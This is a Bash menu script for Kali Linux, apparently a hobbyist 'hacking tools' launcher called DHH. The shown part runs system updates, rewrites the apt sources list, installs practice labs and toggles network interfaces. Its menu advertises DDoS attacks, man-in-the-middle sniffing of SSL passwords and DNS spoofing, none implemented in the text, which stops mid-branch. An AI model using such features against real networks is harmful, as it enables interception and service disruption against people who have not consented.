
#!bin/bash

#######################################################################################################################
                                                                                                                      #
##################                                                                                                    #
#   intro        # 10/6/2016--21/7/2017                                                                               #
##################                                                                                                    #
                                                                                                                      # 
#############################################################################################################         #
#                                                                                                           #         #
# this tool by [->[Oseid Aldary<-][JOKER11]                                                                 #         #
# for help Please Visit My Account{https://www.facebook.com/profile.php?id=100017170449859                  #         #
#                                                                                                           #         #
######################################### WHAT IS [DHH]tool #################################################         #
                                                                                                            #         #
#DHH she a tool that has been programmed To help hackers on penetration and she also helps                  #         #
#those who do not have enough experience in the Kali Linux system on penetration easily                     #         #
#This tool is best for [Kali linux]                                                                         #         #
                                                                                                            #         #
#In order to download the best penetration testing tools                                                    #         # 
#                                                                                                           #         #
#It will save you a lot of time                                                                             #         #
#                                                                                                           #         #
#The tool is under constant development :)                                                                  #         #
#                                                                                                           #         #
# and will soon be the best to download hacking tools                                                       #         #
#                                                                                                           #         #
#############################################################################################################         #
                                                                                                                      #
################################################################################                                      #
                                                                               #                                      #
# Thank you my brother Ahmed and my friend Omar for helping me to              #                                      #
#program this tool                                                             #                                      #
                                                                               #                                      #
################################################################################                                      #
                                                                                                                      #
                                                                                                                      #
#############################################################                                                         #
# ---------------------                                     #                                                         #
# check if user is root                                     #                                                         #
# ---------------------                                     #                                                         #
if [ $(id -u) != "0" ]; then                                #                                                         #
echo "[*!] we need to be root to run this tool !...  "      #                                                         #
echo "[*!] type [ sudo ./DHH.sh ] on your terminal"         #                                                         #
exit                                                        #                                                         #
else                                                        #                                                         #
echo "root user" > /dev/null 2>&1                           #                                                         #
fi                                                          #                                                         # 
                                                            #                                                         #
#############################################################                                                         #
                                                                                                                      #
########## Configure colors ###########                                                                               #
                                      #                                                                               #                  
RED=$(tput setaf 1 && tput bold)      #                                                                               #                  
GREEN=$(tput setaf 2 && tput bold)    #                                                                               #                  
white=$(tput sgr0)                    #                                                                               #                  
BLUE=$(tput setaf 6 && tput bold)     #                                                                               #                  
                                      #                                                                               #                  
#######################################                                                                               #
                                                                                                                      #
################################ CONFIGURATIONS #######################################                               #
                                                                                      #                               #
netinfo=$(ip route show default | awk '/default/ {print $3}')                         #                               #
intarconn=$(ip route show | awk '(NR == 2) {print $3}')                               #                               #
intarall=$(ifconfig -a | cut -d " " -f1 | sed '/^$/d' | egrep -v 'lo|vm')             #                               #
myip=$(ip route show | awk '(NR == 2) {print $9}')                                    #                               #
                                                                                      #                               #
users=`who | cut -d' ' -f1 | sort | uniq`                                             #                               #
OS=`uname`                                                                            #                               #
username=$(uname -n )                                                                 #                               #
MYMAC=$(ifconfig $intarconn | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}')  #                               #
ArCh=`uname -m`                                                                       #                               #
if [ "$ArCh" = "i686" ]; then                                                         #                               #
  arch="i686"                                                                         #                               #
                                                                                      #                               #
else                                                                                  #                               #
  arch="wine64"                                                                       #                               #
                                                                                      #                               #
fi                                                                                    #                               #
                                                                                      #                               #
hh=`echo ~`                                                                           #                               #
path=`pwd`                                                                            #                               #
                                                                                      #                               #
                                                                                      #                               #
#######################################################################################                               # 
                                                                                                                      #
#################### Exit #########################                                                                   #
                                                  #                                                                   #      
trap ctrl_c INT                                   #                                                                   #        
ctrl_c() {                                        #                                                                   #       
exi                                               #                                                                   #     
}                                                 #                                                                   # 
                                                  #                                                                   #
exi () {                                          #                                                                   #
echo                                              #                                                                   # 
echo                                              #                                                                   #
echo -n "Do you want exit !? [Y/N] : "            #                                                                   #
read exite                                        #                                                                   #
if [[ $exite = Y || $exite = y ]];then            #                                                                   #
                                                  #                                                                   # 
echo "" $GREEN                                    #                                                                   #
echo                                              #                                                                   #
echo                                              #                                                                   #
echo "thanks for using"                           #                                                                   #
sleep 2                                           #                                                                   #
echo "" $RED                                      #                                                                   #
echo "see you letar"                              #                                                                   #
sleep 1                                           #                                                                   #
echo                                              #                                                                   #
echo "" $BLUE                                     #                                                                   #
echo "goodbye :) "                                #                                                                   #
sleep 1                                           #                                                                   #
clear                                             #                                                                   #
exit 1                                            #                                                                   #
else                                              #                                                                   #
clear                                             #                                                                   #
./DHH.sh                                          #                                                                   #
fi                                                #                                                                   #
                                                  #                                                                   #
}                                                 #                                                                   #
                                                  #                                                                   #
###################################################                                                                   #
###############################                                                                                       #
chmod +x *                    #                                                                                       #
resize -s 38 150  > /dev/null #                                                                                       #
###############################                                                                                       #
                                                                                                                      #
########################################## END OF CONFIGURATIONS TOOL #################################################              
                                                                                          
clear
th=this
clear
echo $RED"|$BLUE=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=$RED| "
echo $RED"| ######                                                   |   #     #                                    #     #                      |"
echo $RED"| #     #  ####  #    # #    # #       ####    ##   #####  |   #     #   ##    ####  #    # ###### #####  #     #  ####  #    # ###### |"
echo $RED"| #     # #    # #    # ##   # #      #    #  #  #  #    # |   #     #  #  #  #    # #   #  #      #    # #     # #    # ##  ## #      |"
echo $RED"| #     # #    # #    # # #  # #      #    # #    # #    # &   ####### #    # #      ####   #####  #    # ####### #    # # ## # #####  |"
echo $RED"| #     # #    # # ## # #  # # #      #    # ###### #    # |   #     # ###### #      #  #   #      #####  #     # #    # #    # #      |"
echo $RED"| #     # #    # ##  ## #   ## #      #    # #    # #    # |   #     # #    # #    # #   #  #      #   #  #     # #    # #    # #      |"
echo $RED"| ######   ####  #    # #    # ######  ####  #    # #####  |   #     # #    #  ####  #    # ###### #    # #     #  ####  #    # ###### |"
echo $RED"|                                                          |                                                                           |"
echo $RED"|$BLUE=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=$RED| "
echo $RED"  |============================================================|"$RED"|[$BLUE We Are Anonymous Arabs$RED ]                                 $RED       }"
echo $RED"  |$GREEN$th tool by [->[Oseid Aldary<-][JOKER11]              $RED     |"$RED"|[$BLUE We Are Legion$RED          ]          username:[$GREEN JOKER11$RED ]          }" 
echo $BULE"  |this tool for download the best tools for hacking andPentest|"$RED"|[$BLUE We Don't Forgive$RED       ]                                        }"
echo $BULE"  |and will soon be the best to download hacking tools         |"$RED"|[$BLUE We Don't Forget $RED       ]          password:[         ]          }"
echo $RED " |DHH V[9.1]                                                  |"$RED"|[$BLUE Expect Us $RED             ]             welcome!                   }"
echo $RED " |============================================================|"$RED"|__________________________________________________________________}"
echo $BLUE"  |------------------------------------------------------------------------------------------|"
echo       "  | For Help Please Visit My Account{https://www.facebook.com/profile.php?id=100017170449859 |"$BLUE
echo       "  |------------------------------------------------------------------------------------------|"
echo ""
echo $BLUE"Usage:"
echo
echo "Enter choice :)"
echo "------------------------------------------------------------------------------------------------------       " 
echo  $GREEN"  0 . what is this tool                   ""          11 . Find CP Admin page of website              "               
echo "  1 . Prerequisites And Updates                  ""   12 . Create Wordlist                            "
echo "  2 . Get Your info                              ""   13 . Install Information Gathering Tools        "
echo "  3 . Network Works                              ""   14 . Install Word List Tools                    "
echo "  4 . Install my other tools for you             ""   15 . Fix Problems In Kali Linux                 "
echo "  5 . Install Tools For DDos Attack              ""   16 . Install Browsers                           "   
echo "  6 . Install Network Tools For Hacking          ""   17 . Install Anony Your Sulf Tools              "
echo "  7 . Install Exploitation Tools                 ""   18 . Exploitation platform                      "
echo "  8 . DDos Attack On [ Websites/ or /In Network ]""   19 . System Services                            "
echo "  9 . Information Gathering                      ""   20 . Install HID ATTACK                         "
echo " 10 . Searchsploit                               ""    Q .$RED Exit -->                               "
echo "" $RED
echo -n " Enter choice ->>> "$BLUE
read word
echo
	if [[ $word == '' ]];then
		clear
	       ./DHH.sh
	else
if [ $word = 0 ];then
clear
cat << !


$RED
#####################################$BLUE WHAT IS DHH TOOL$RED ########################################$GREEN
                                                                                              $BLUE#$GREEN
DHH she a tool that has been programmed To help hackers on penetration and she also helps     $BLUE#$GREEN                
those who do not have enough experience in the Kali Linux system on penetration easily        $BLUE#$GREEN             
This tool is best for [Kali linux]                                                            $BLUE#$GREEN  
In order to download the best penetration testing tools                                       $BLUE#$GREEN                           
It will save you a lot of time                                                                $BLUE#$GREEN  
The tool is under constant development :)                                                     $BLUE#$GREEN  
and will soon be the best for download hacking tools and penetration                          $BLUE#$GREEN  
                                                                                              $BLUE#$RED  
#############################################                                                 $BLUE#$GREEN    
this tool by [->[$RED Oseid Aldary$GREEN ]<-][JOKER11]$RED#$RED                                                 $BLUE#$RED
#############################################                                                 $BLUE#
$BLUE                                                                                              #
###############################################################################################$GREEN
For Help Please Visit My Account$RED{https://www.facebook.com/profile.php?id=100017170449859}     $BLUE#
                                                                                              #
and tell me what the problem is $BLUE                                                              #
############################################################################################### 

!
read -p "Press Enter to back "
clear
./DHH.sh
else
if [ $word = 1 ];then
clear
	echo
echo
echo ""
	echo
echo
echo
echo $RED"                   *                                     *";
echo $BLUE "                  *    PREREQUISITES AND UPDATES MENU   *";
echo $RED"                   ***************************************";
echo $RED"                   *    1 .  update kali 2016.2 to 2017.1*";
echo $RED"                   *    2 .  update kali linux           *";
echo $RED"                   *    3 .  update and Clean kali       *";
echo $RED"                   *    4 .  upgrade kali linux          *";
echo $RED"                   *    5 .  Distribution upgrade        *";
echo $RED"                   *    6 .  update sources list         *";
echo $RED"                   *                                     *";
echo $BLUE"                   *#####################################*";
echo $RED"                   *                                     *";
echo $RED"                   *    7 .  Edit DHCP tunnel interface  *";
echo $RED"                   *    8 .  Install Dhcp3-server        *";
echo $RED"                   *    9 .  install vokoscreen          *";
echo $RED"                   *   10 .  Update aircrack-ng          *";
echo $RED"                   *   11 .  install VPN pptp            *";
echo $RED"                   *   12 .  install terminator          *";
echo $RED"                   *   13 .  install bwapp               *";
echo $RED"                   *   14 .  install dvwa                *";
echo $RED"                   *   15 .  install VirtualBox          *";
echo $RED"                   *   16 .  install RecordMyDesktop     *";
echo $RED"                   *   17 .  install ftp-server          *";
echo $RED"                   *   18 .  Return to Main Menu         *";
echo $RED"                   ***************************************";
echo "" $BLUE
echo -n "Enter choice ->> "$RED
read my
if [[ $my = '' ]];then
	clear
./DHH.sh
	else
	if [ $my = 1 ];then
clear
echo
echo "" $BLUE 
		echo -n "Do you want update your kali 2016.2 to kali 2017.1 ?$RED [Y/N] : "$GREEN
	read rer
echo 
	if [[ $rer = n || $rar = N ]];then
	echo
	clear
	./DHH.sh
else
	if [[ $rer = Y || $rer = y ]];then
	clear
	echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
ping -c 1 google.com > /dev/null 2>&1
   if [ "$?" != 0 ]
then
sleep 3
clear
	echo
echo
	echo $GREEN"[!]You are not connected to the Internet ! "$BLUE
echo
	echo "[!]please Connect to the internet and try again :) "
echo
exit
	fi
echo
	echo "$BLUE[*] $GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo $GREEN "=======update your kali linux 2016.2 to kali linux 2017.1======="
sleep 4
echo $RED"[*]working........"
sleep 1
rm /etc/apt/sources.list
		echo "" >> /etc/apt/sources.list
		echo 'deb https://http.kali.org/kali kali-rolling main non-free contrib' >> /etc/apt/sources.list
		echo 'deb-src https://http.kali.org/kali kali-rolling main non-free contrib' >> /etc/apt/sources.list
 apt-get -y update
                apt dist-upgrade
                echo $GREEN"Done your kali linux update now ! "
                echo
                echo -n "Do you want restart your system to end update kali linux ? [Y/N] : "
                read nm
                echo
                if [[ $nm = Y || $nm = y ]];then
	clear
reboot
else
	if [[ $nm = N || $nm = n ]];then
clear
echo
echo
	echo "Well goodbye but you must restart your system soon ! "
sleep 5
clear
./DHH.sh
fi
fi
fi
fi
	else
	if [ $my = 2 ];then
	clear
	echo
	echo "checking $RED[internet]$BLUE connections$RED........"
	echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
	sleep 3
	clear
echo
	echo
	echo $GREEN"[!]you are not connect to the internet ! "$BLUE
echo
	echo "[!]please Connect to the internet and try again :) "
echo
exit
fi
echo
	echo "$BLUE[*]$GREEN [ CONNECT ]"
sleep 1
clear
echo
echo
	echo "=========update kali linux for you========="
sleep 4
echo $RED"[*]working....."
sleep 1
sudo apt-get -y update
echo $GGREN"[*]Finishing....."
sleep 7
clear
./DHH.sh
else
if [ $my = 3 ];then
clear
echo
	echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]
then
sleep 3
clear
echo
echo
	echo $GREEN"[!]you are not connect to the internet ! "$BLUE	
echo
	echo "[!]please Connect to the internet and try again :) "
echo
exit
fi
	echo "$BLUE[*] $GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo $RED"========update and clean kali for you========"
sleep 4
echo "[*]working.........."
sleep 1 
sudo apt-get -y update && apt-get -y clean
echo $GREEN"[*]Finishing....."
sleep 7
clear
./DHH.sh
else
if [ $my = 4 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]
then
sleep 3
clear
echo
echo
echo $GREEN"[!]you are not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) "
echo
exit
fi
echo
echo "$BLUE[*] $GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo "$RED=======upgrade kali linux for you=========="
sleep 4
echo "[*]working....."
sleep 1
sudo apt-get -y upgrade
echo $GREEN"[*]Finishing....."
sleep 7
clear
./DHH.sh
else
if [ $my = 5 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]
then
sleep 3
clear
echo
echo
echo $GREEN"[!]you are not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) "
echo
exit
fi
echo
echo "$BLUE[*] $GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo  "$RED==========dist-upgrade kali for you======="
sleep 4
echo "[*]working....."
sleep 1
sudo apt-get -y dist-upgrade
echo $GREEN"[*]Finishing....."
sleep 7
clear
./DHH.sh
else
if [ $my = 6 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you are not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) "
echo
exit
fi
echo
echo "$BLUE[*] $GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo $BLUE"=========update sources.list for you============"$RED
sleep 4
echo "[*]working........"
sleep 1
rm /etc/apt/sources.list
		echo "" >> /etc/apt/sources.list
                echo '#The Kali Rolling Repository' >> /etc/apt/sources.list
		echo 'deb http://http.kali.org/kali kali-rolling main contrib non-free' >> /etc/apt/sources.list
		echo 'deb-src http://http.kali.org/kali kali-rolling main contrib non-free' >> /etc/apt/sources.list
		apt-get -y update
echo $GREEN"[*]Finishing....."
sleep 7
clear
./DHH.sh
else



if [ $my = 7 ];then
nano /etc/default/dhcp3-server
clear
./DHH.sh
else



if [ $my = 8 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you are not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) "
echo
exit
fi
echo 
echo "$BLUE[*] $GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo $RED"=========install DHCP-server for you========="
sleep 4
echo "[*]working....."
sleep 1
apt-get -y install dhcp3-server
echo $GREEN"[*]Finishing....."
sleep 7
clear
./DHH.sh
else
if [ $my = 9 ];then
clear
echo 
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you are not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo "$BLUE[*] $GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo $RED"========install vokoscreen for you========="
sleep 4
echo "[*]working........"
sleep 1
sudo apt-get -y update && apt-get -y install vokoscreen
echo $GREEN"[*]Finishing....."
sleep 7
clear
./DHH.sh
else
if [ $my = 10 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you are not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo "$BLUE[*] $GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo $RED"=======update aircrack-ng for you========"
sleep 4
echo "[*]working......."
sleep 1
sudo airodump-ng-oui-update
echo $GREEN"[*]Finishing....."
sleep 7
clear
./DHH.sh
else
if [ $my = 11 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo "$BLUE[*] $GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo $RED"=====install VPN PPTP for you======"
sleep 4
echo "[*]working...."
sleep 1 
sudo apt-get -y install network-manager-pptp network-manager-pptp-gnome 
echo $GREEN"[*]Finishing....."
sleep 7
clear
./DHH.sh
else 
if [ $my = 12 ];then 
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo "$BLUE[*] $GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo $RED"====install terminator for you====="
sleep 4
echo "[*]working......"
sleep 1
sudo apt-get -y install terminator
echo $GREEN"[*]Finishing....."
sleep 7
clear
./DHH.sh
else
if [ $my = 13 ];then
clear
echo "" $GREEN
echo -n "[!]Do You want install bwapp ? $RED[Y/N] : "$BLUE
read install
if [[ $install = Y || $install = y ]] ; then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo "$BLUE[*] $GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
chmod +x install-bwapp.sh &&./install-bwapp.sh
else
if [[ $install = N || $install = n ]];then
clear
echo
echo
echo "Ok,maby later "
sleep 2
clear
./DHH.sh
fi
fi
else
if [ $my = 14 ];then
clear
echo 
echo "" $GREEN
echo -n "[!]Do Youw want install dvwa ? $RED[Y/N] : "$BLUE
read install
if [[ $install = Y || $install = y ]] ; then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo "$BLUE[*] $GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
chmod +x install-dvwa.sh &&./install-dvwa.sh
else
if [[ $install = N || $install = n ]];then
clear
echo
echo
echo "Ok,maby later "
sleep 2
clear
./DHH.sh
fi
fi
else
if [ $my = 15 ];then 
        clear
        echo
        echo "" $RED
	echo -n "Do you want to install virtualbox ? [Y/N] : "
	read install
	if [[ $install = Y || $install = y ]] ; then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo "$BLUE[*] $GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
		echo $RED "============Install Virtualbox for you============ "
sleep 4
echo "[*]working.........."
sleep 1
		apt-get -y install virtualbox-guest-x11 virtualbox virtualbox-ext-pack linux-headers*
		usermod -a -G vboxusers ddos
echo $GREEN"[*]Finishing......"
sleep 7
clear
./DHH.sh
	else
		if [[ $install = N || $install = n ]];then
clear
echo
echo
echo "Ok,maby later"
sleep 3
clear
./DHH.sh
        fi
	fi
else
if [ $my = 16 ];then
clear
echo
echo "" $GREEN
echo -n "Do you want to install RecordMyDesktop ?$RED [Y/N] : "$BLUE
	read install
	if [[ $install = Y || $install = y ]] ; then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) "
echo
exit
fi
echo
echo "$BLUE[*] $GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
		echo $RED "============install RecordMyDesktop for you=============="
sleep 4
echo "[*]working........."
sleep 1
		apt-get -y install gtk-recordmydesktop
		echo  $GREEN"[*]Finishing......"
sleep 7
clear
./DHH.sh
	else
if [[ $install = N || $install = n ]];then
clear
echo
echo
echo "Ok,maby later"
sleep 3
clear
./DHH.sh

	fi
        fi

else
if [ $my = 17 ];then 
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo 
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) "
echo
exit
fi
echo
echo "$BLUE[*] $GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo $RED"========install FTP-server for you==========="
sleep 4
echo "working..........."
sleep 1
apt-get -y install ftp && apt-get -y install ftp-update
echo  $GREEN"[*]Finishing......"
sleep 7
clear
./DHH.sh
else
if [ $my = 18 ];then
clear
./DHH.sh
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
else
if [ $word = 2 ];then
clear
echo
echo "       [*]Please wait..........."
sleep 3
echo
echo "       [*]giting your info........."
sleep 3
echo
echo "       [*]Found  "
sleep 2
echo
echo 
echo $RED
echo "##############################$BLUE
     YOUR INFO $RED
##############################"$BLUE
echo
echo "#############################################               "$BLUE
echo "your GATEWAY $RED >> $GREEN $netinfo $RED <<                "$BLUE
if [[ $netinfo = '' ]];then
echo
echo $GREEN"you not connect to the Network !                      "$BLUE
fi
echo "#############################################               "
echo "your all interfaces $RED>> $GREEN
$intarall "$BLUE
echo "your intarface connect $RED >> $GREEN $intarconn $RED <<    "$BLUE
if [[ $intarconn = '' ]];then
echo
echo $GREEN"you not conncet to the Network !                      "$BLUE
fi
echo "#############################################               "
echo "your local ip $RED >>$GREEN $myip $RED <<                   "$BLUE
if [[ $myip = '' ]];then
echo
echo $GREEN"your not connect to the Network !                     "$BLUE
fi
echo "#############################################               "
echo "your Mac Address $RED >> $GREEN $MYMAC $RED <<              "$BLUE
echo "#############################################               "
echo "your users $RED >> $GREEN $users $RED <<                    "$BLUE
echo "#############################################               "
echo "your Os $RED >> $GREEN $OS $RED <<                          "$BLUE
echo "#############################################               "
echo "your System architecture $RED >> $GREEN $arch $RED <<       "$BLUE
echo "#############################################               "
echo "your username $RED >> $GREEN $username $RED <<              "$BLUE
echo "#############################################               "
echo
echo
read -p "press Enter to back to the menu "
clear
./DHH.sh
else
if [ $word = 3 ] ;then
clear
echo
echo ""$GREEN
echo "###################################################"$RED
echo "                                                   ";
echo "         ┌┐┌┌─┐┌┬┐┬ ┬┌─┐┬─┐┬┌─┬┌┐┌┌─┐              ";
echo "         │││├┤  │ ││││ │├┬┘├┴┐│││││ ┬              ";
echo "$BLUE  MITM $RED<<┘└┘└─┘ ┴ └┴┘└─┘┴└─┴ ┴┴┘└┘└─┘>>$BLUE SNIFFING   "$GREEN
echo "                                                   ";
echo "###################################################"$RED
echo "options :"$BLUE
echo " 1 > Enable Monitor Mode                  ";
echo " 2 > Disabled Monitor Mode                ";
echo " 3 > ping on Something                    ";
echo " 4 > Show Yuor Info Use Ifconfig          ";
echo " 5 > Down Interface                       ";
echo " 6 > Up Interface                         ";
echo " 7 > Restart Network-Manager              ";
echo " 8 > Change your hostname                 ";
echo " 9 > Change Your MAC Address              ";
echo "10 > Find Your Public IP Address          ";
echo "11 > Find Live Hosts In Your Network      ";
echo "12 > open your router CP Page             ";
echo "13 > Edet etter.dns                       ";
echo "14 > Edit etter.conf                      ";
echo
echo "$RED############ SNIFF & MITM ##############"$BLUE
echo
echo "15 > Sniff on target visit website [http!]";
echo "16 > Sniff target browser Pictures        ";
echo "17 > Sniff SSL login passwords [https!]   ";
echo "18 > Man In The Midle Attack              ";
echo "19 > Sniff on all targets in netowrk [dump /pic/http/https!!]  "
echo "20 > Dns-Spoof + MITM $GREEN !";
echo
echo "21 >$RED EXIT                    ";
echo ""$GREEN
echo -n "Enter choice ->> "$RED
read choice
if [[ $choice = '' ]];then
clear
./DHH.sh
else
if [ $choice = 1 ];then
clear
echo
echo
echo -n " [*]Finding your Network Interfaces... "$GREEN
sleep 2
echo ""$BLUE
echo ""

ifconfig -a | cut -d " " -f1 | sed '/^$/d' | egrep -v 'lo|vm'

echo
echo "" $RED
echo -n "[*]Enter Your Interface : "$BLUE
read interface
if [[ $interface = '' ]];then
clear
echo
echo
echo "You Not Enter the Interface !? "
echo
exit
fi
clear
airmon-ng start $interface
clear
echo
echo
echo "$GREEN Monitor on $BLUE($RED>$BLUE $interface $RED <$BLUE)$GREEN has been Enable "
echo
echo
read -p "press Enter to back to the menu "
clear
./DHH.sh
else
if [ $choice = 2 ];then
clear
echo
echo
echo -n " [*]Finding your Network Interfaces... "$GREEN
sleep 2
echo ""$BLUE
echo ""

ifconfig -a | cut -d " " -f1 | sed '/^$/d' | egrep -v 'lo|vm'

echo
echo "" $RED

echo -n "[*]Enter Your Interface >[ "$BLUE
read interface
if [[ $interface = '' ]];then
clear
echo
echo
echo "You Not Enter the Interface !? "
echo
exit
fi
clear
airmon-ng stop $interface
clear
echo 
echo
echo "$GREEN Monitor on $BLUE($RED>$BLUE $interface $RED <$BLUE)$GREEN has been Disabled "
echo
echo 
read -p "press Enter to back to the menu "
clear
./DHH.sh
else
if [ $choice = 3 ];then
clear
echo
echo  ""$GREEN
echo -n "Enter the IP address or website to ping on him : $RED "
read hh
if [[ $hh = '' ]];then
clear
echo
echo $GREEN
echo "[!]You Not Enter the ip or website !? "
echo
exit
fi
clear
ping -i 01 -c 10 $hh 
sleep 1 
echo
echo
echo
sleep 1
read -p "press Enter to back to the menu"
clear
./DHH.sh
else
if [ $choice = 4 ];then
clear
echo
ifconfig
echo
echo "" $BLUE
read -p "press Enter to back to the menu"
clear
./DHH.sh
else
if [ $choice = 5 ];then
clear
echo
echo
echo -n " [*]Finding your Network Interfaces... "$GREEN
sleep 2
echo ""$BLUE
echo ""

ifconfig -a | cut -d " " -f1 | sed '/^$/d' | egrep -v 'lo|vm'

echo
echo "" $RED
echo -n "[*]Enter Your Interface for down : "$BLUE
read interface
if [[ $interface = '' ]];then
clear
echo
echo
echo "You Not Enter the Interface !? "
sleep 3
echo
clear
./DHH.sh
fi
clear
echo
echo
echo "Down (> $interface <)........."
sleep 2
ifconfig $interface down
sleep 2
echo
echo "Done your interface has been down "
sleep 2
echo
echo
read -p "press Enter to back to the menu "
clear
./DHH.sh
else
if [ $choice = 6 ];then
clear
echo
echo
echo -n " [*]Finding your Network Interfaces... "$GREEN
sleep 2
echo ""$BLUE
echo ""

ifconfig -a | cut -d " " -f1 | sed '/^$/d' | egrep -v 'lo|vm'

echo
echo ""$RED
echo -n "[*]Enter Your Interface for Up : "$BLUE
read interface
if [[ $interface = '' ]];then
clear
echo
echo
echo "You Not Enter the Interface !? "
sleep 3
clear
./DHH.sh
fi
clear
echo
echo
echo "UP (> $interface <)........."
sleep 2
ifconfig $interface up
sleep 2
echo
echo "Done your interface has been UP "
sleep 2
echo
echo
read -p "press Enter to back to the menu "
clear
./DHH.sh
else
if [ $choice = 7 ];then
clear
echo
echo
echo "restart your Network-Manager............"
sleep 2
service network-manager restart
sleep 2
echo
echo
echo "Done your network-manager has been restartd "
echo
sleep 1
echo
read -p "press Enter to back to the the menu "
clear
./DHH.sh
else
if [ $choice = 8 ];then
clear
echo
echo ""$GREEN
echo -n "Enter New Hostname : $RED"
read name
echo "$name" > /etc/hostname
service network-manager restart
sleep 2
echo
echo
echo "$BLUE[*]$RED:$GREEN Working............."
sleep 3
echo
echo
echo ""$GREEN
echo "Done! your hostname is  [->($RED$name$GREEN)<-]$BLUE now :) "$GREEN
sleep 2
echo
read -p "press Enter to back to the menu "
clear
./DHH.sh
else
if [ $choice = 9 ];then
clear
echo ""$BLUE
echo "checking if $RED[MACCHANGER]$BLUE exists$RED........"
sleep 2
echo
if [ -f /usr/bin/macchanger ];then 
echo "$BLUE[*]$RED:$BLUE[Macchanger]:${white}installation found...$BLUE"
sleep 2
else
echo
echo "$RED[!]${GREEN}Macchanger is not installation "
echo
th=this
echo $RED[x]:[waring]:$BLUE$th module needs $RED[Macchanger]$BLUE to work
echo
echo ""$GREEN
